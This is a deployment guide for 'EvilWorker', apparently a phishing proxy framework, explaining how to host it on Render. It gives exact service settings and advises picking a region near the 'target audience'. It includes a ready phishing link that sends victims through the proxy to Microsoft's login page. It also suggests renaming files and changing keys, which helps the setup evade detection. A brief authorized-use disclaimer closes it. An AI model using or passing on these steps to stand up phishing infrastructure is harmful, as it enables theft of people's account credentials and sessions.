# 🚀 EvilWorker Deployment on Render

This guide will help you deploy the EvilWorker framework on Render's PaaS platform.

## 📋 Prerequisites

- A Render account (free tier available)
- Git repository with your EvilWorker code
- Basic understanding of Docker and web services

## 🔧 Deployment Steps

### 1. Prepare Your Repository

Ensure your repository contains these files:
- `proxy_server.js` - Main server file
- `package.json` - Node.js configuration
- `Dockerfile` - Container configuration
- `render.yaml` - Render deployment config
- All HTML, JS, and other framework files

### 2. Deploy on Render

#### Option A: Using render.yaml (Recommended)
1. Push your code to GitHub/GitLab
2. In Render dashboard, click "New +"
3. Select "Blueprint" 
4. Connect your repository
5. Render will automatically detect `render.yaml` and deploy

#### Option B: Manual Deployment
1. Push your code to GitHub/GitLab
2. In Render dashboard, click "New +"
3. Select "Web Service"
4. Connect your repository
5. Configure:
   - **Name**: `evilworker` (or your preferred name)
   - **Environment**: `Docker`
   - **Region**: Choose closest to your target audience
   - **Branch**: `main` (or your default branch)
   - **Build Command**: `docker build -t evilworker .`
   - **Start Command**: `docker run -p $PORT:3000 evilworker`

### 3. Environment Variables

Render will automatically set:
- `PORT` - The port your service runs on
- `NODE_ENV` - Set to `production`

### 4. Custom Domain (Optional)

1. In your service settings, go to "Custom Domains"
2. Add your domain (e.g., `evilworker.yourdomain.com`)
3. Configure DNS records as instructed by Render

## 🌐 Access Your Framework

After deployment, your EvilWorker will be available at:
- **Render URL**: `https://your-service-name.onrender.com`
- **Custom Domain**: `https://yourdomain.com` (if configured)

## 🔗 Phishing Link Format

Replace `localhost:3000` with your Render URL:

```
https://your-service-name.onrender.com/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
```

## ⚠️ Important Security Notes

1. **Change Default Values**: Modify the configuration constants in `proxy_server.js`
2. **Update Encryption Key**: Change `ENCRYPTION_KEY` for production use
3. **Customize File Names**: Update `PROXY_FILES` and `PROXY_PATHNAMES` arrays
4. **Monitor Logs**: Check Render logs for any errors or suspicious activity

## 🔍 Troubleshooting

### Common Issues:

1. **Build Failures**: Ensure Node.js version compatibility (>=22.15.0)
2. **Port Conflicts**: Render automatically handles port assignment
3. **Service Unavailable**: Check health check path and service logs
4. **Memory Issues**: Upgrade to a higher plan if needed

### Logs and Monitoring:

- **Build Logs**: Available in Render dashboard during deployment
- **Runtime Logs**: Access via "Logs" tab in your service
- **Health Checks**: Monitor service status and uptime

## 🚨 Legal and Ethical Considerations

- **Authorized Use Only**: Only deploy against authorized targets
- **Red Teaming**: Use for legitimate security testing
- **Compliance**: Ensure compliance with local laws and regulations
- **Documentation**: Keep records of all testing activities

## 📞 Support

- **Render Support**: [render.com/docs](https://render.com/docs)
- **EvilWorker Issues**: [GitHub Issues](https://github.com/Ahaz1701/EvilWorker/issues)
- **Community**: Check the original EvilWorker repository for community support

---

**Happy Deploying! 🎯**
